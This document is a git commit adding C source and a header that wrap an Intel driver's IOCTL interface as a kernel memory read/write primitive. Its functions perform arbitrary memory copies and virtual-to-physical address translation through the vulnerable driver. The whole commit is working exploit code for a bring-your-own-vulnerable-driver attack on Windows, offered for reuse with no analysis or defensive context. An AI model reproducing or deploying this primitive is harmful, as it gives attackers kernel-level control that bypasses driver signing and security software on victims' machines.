58adb12ca890e3979183a903c2eff226adf27917
realoriginal <jihadism@muslim.com>
2020-01-21 00:34:34 +0000

    intel cpu driver r/w primitive

---
+++ intel.c
@@ -0,0 +1,59 @@
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include "intel.h"
+
+BOOL MemCpy(
+	HANDLE hDriver,
+	ULONG64 Destination,
+	ULONG64 Source,
+	ULONG64 Length
+)
+{
+	MEMCPY_INFO MemCpyInfo;
+	DWORD       ReturnBytes;
+
+	MemCpyInfo.CaseNum = CASE_NUMBER_MEMCPY;
+	MemCpyInfo.Src     = Source;
+	MemCpyInfo.Dst     = Destination;
+	MemCpyInfo.Len     = Length;
+
+	return DeviceIoControl(
+		hDriver, 
+		IOCTL_TRIGGER_FUNCTION,
+		&MemCpyInfo,
+		sizeof(MEMCPY_INFO),
+		NULL,
+		0,
+		&ReturnBytes,
+		NULL
+	);
+};
+
+BOOL GetPhys(
+	HANDLE hDriver,
+	ULONG64 VirtualAddress,
+	ULONG64 *lpPhysicalAddress
+)
+{
+	GET_PHYS_INFO GetPhysicalAddr;
+	DWORD         ReturnBytes;
+
+	GetPhysicalAddr.CaseNum  = CASE_NUMBER_GET_PHYSICAL;
+        GetPhysicalAddr.VirtAddr = VirtualAddress;
+	
+	if ( DeviceIoControl(
+		hDriver,
+		IOCTL_TRIGGER_FUNCTION,
+		&GetPhysicalAddr,
+		sizeof(GET_PHYS_INFO),
+		NULL,
+		0,
+		&ReturnBytes,
+		NULL
+	     ) 
+        ) { 
+	  *lpPhysicalAddress = GetPhysicalAddr.PhysAddr;
+	  return TRUE;
+	};
+	return FALSE;
+};
---
+++ intel.h
@@ -0,0 +1,25 @@
+#ifndef _INTEL_H_
+#define _INTEL_H_
+
+#define IOCTL_TRIGGER_FUNCTION   0x80862007
+#define CASE_NUMBER_MEMCPY       0x33
+#define CASE_NUMBER_GET_PHYSICAL 0x25
+
+typedef struct _MEMCPY_INFO
+{
+  ULONG64 CaseNum;
+  ULONG64 Reserved;
+  ULONG64 Src;
+  ULONG64 Dst;
+  ULONG64 Len;
+} MEMCPY_INFO, *LPMEMCPY_INFO;
+
+typedef struct _GET_PHYS_INFO
+{
+  ULONG64 CaseNum;
+  ULONG64 Reserved;
+  ULONG64 PhysAddr;
+  ULONG64 VirtAddr;
+} GET_PHYS_INFO, *LPGET_PHYS_INFO;
+
+#endif
